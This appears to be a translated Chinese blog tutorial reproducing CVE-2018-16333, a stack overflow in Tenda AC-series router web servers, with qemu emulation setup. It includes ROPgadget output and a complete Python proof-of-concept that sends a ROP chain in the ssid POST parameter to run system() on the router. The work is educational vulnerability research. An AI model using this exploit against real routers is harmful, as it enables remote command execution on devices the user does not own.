# CVE-2018-16333：Tenda路由器缓冲区溢出漏洞复现（含qemu调试环境搭建）
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
开始学习IOT的漏洞挖掘和利用，网上没有发现该CVE的复现文章，于是拿来练练手，并摸熟IOT的环境搭建过程。CVE-2018-16333是个比较简单的栈溢出漏洞，影响AC9、AC7、AC10、AC15、AC18
等多款产品，此次分析采用US_AC15V1.0BR_V15.03.05.19_multi_TD01固件版本进行分析复现。
固件和poc可在github下载：
## 漏洞分析
首先查看程序开启的保护机制，可以发现没有开启PIE和canary保护。
根据CVE的描述，There is a buffer overflow vulnerability in the router’s web server.
While processing the ssid parameter for a POST request, the value is directly
used in a sprintf call to a local variable placed on the stack, which
overrides the return address of the function, causing a buffer
overflow.漏洞的原因是web服务在处理post请求时，对ssid参数直接复制到栈上的一个局部变量中导致栈溢出。根据ssid字符串定位到form_fast_setting_wifi_set函数。
程序获取ssid参数后，没有经过检查就直接使用strcpy函数复制到栈变量中。其中有个细节：第一次的strcpy如果要溢出到返回地址，会覆盖第二次的strcpy的参数dst。因此，为了将src指针覆盖为有效地址，并且不影响第一次的strcpy，我选择在libc中选择一个可读地址覆盖src指针。  
搜索可用的gadget
    ╰─➤  ROPgadget --binary ./lib/libc.so.0 --only "pop"| grep r3
    0x00018298 : pop {r3, pc}    #gadget1
    ╰─➤  ROPgadget --binary ./lib/libc.so.0  | grep "mov r0, sp"
    0x00040cb8 : mov r0, sp ; blx r3    #gadget2
利用过程：
  * 1、溢出后跳到第一个gadget1，控制r3寄存器为system函数地址，第一个pc控制为gadget2
  * 2、跳转到gadget2后，控制r0为要执行的命令即可
  * 3、执行system(cmd)
## qemu用户级调试
安装qemu-user-static
    sudo apt install qemu-user-static
安装完成后将qemu-arm-static赋值到文件系统目录squashfs-root下，启动httpd服务
    cp $(which qemu-arm-static) ./qemu
    sudo chroot ./ ./qemu ./bin/httpd
启动后卡在Welcome to …后面，因为程序会检查网络，用IDA将如下两个函数的返回值patch为1
将patch后的程序替换原来的httpd，重新启动
程序监听的ip地址是255.255.255.255，应该是网络配置问题。
根据`httpd listen ip =`字符串  /proc/sys/kernel/randomize_va_space
成功执行system(“echo hello”)！
poc如下：
    import requests
    from pwn import *
    cmd="echo hello"
    '''
    qemu-user
    '''
    #libc_base = 0xf659c000
    '''
    qemu-system
    '''
    libc_base = 0x76dab000
    dosystemcmd = 0x76f930f0
    system = libc_base + 0x5A270
    readable_addr = libc_base + 0x64144
    mov_r0_ret_r3 = libc_base + 0x40cb8
    pop_r3 = libc_base + 0x18298
    payload = 'a'*(0x60) + p32(readable_addr) + 'b'*(0x20-8)
    payload+= p32(pop_r3) + p32(system) + p32(mov_r0_ret_r3) + cmd
    url = "http://192.168.198.76/goform/fast_setting_wifi_set"
    cookie = {"Cookie":"password=12345"}
    data = {"ssid": payload}
    response = requests.post(url, cookies=cookie, data=data)
    response = requests.post(url, cookies=cookie, data=data)
    print(response.text)
## Reference
[写给初学者的IoT实战教程之ARM栈溢出](https://www.anquanke.com/post/id/204326)  
[Tenda漏洞环境搭建与复现](https://www.nosec.org/home/detail/4634.html)  
[Tenda AC15
栈溢出漏洞调试](https://xz.aliyun.com/t/7357?spm=5176.12901015.0.i12901015.65db525cQBSuI3&accounttraceid=1d7f8f3f083842dba12fa62662c34665asfk)  
[ubuntu下qemu虚拟机实现和主机以及互联网通信](https://blog.csdn.net/qq_34160841/article/details/104901127)  
[QEMU 网络配置一把梭](https://wzt.ac.cn/2019/09/10/QEMU-networking/)  
[qemu虚拟机网桥通讯过程](https://www.cnblogs.com/xia-dong/p/11555625.html)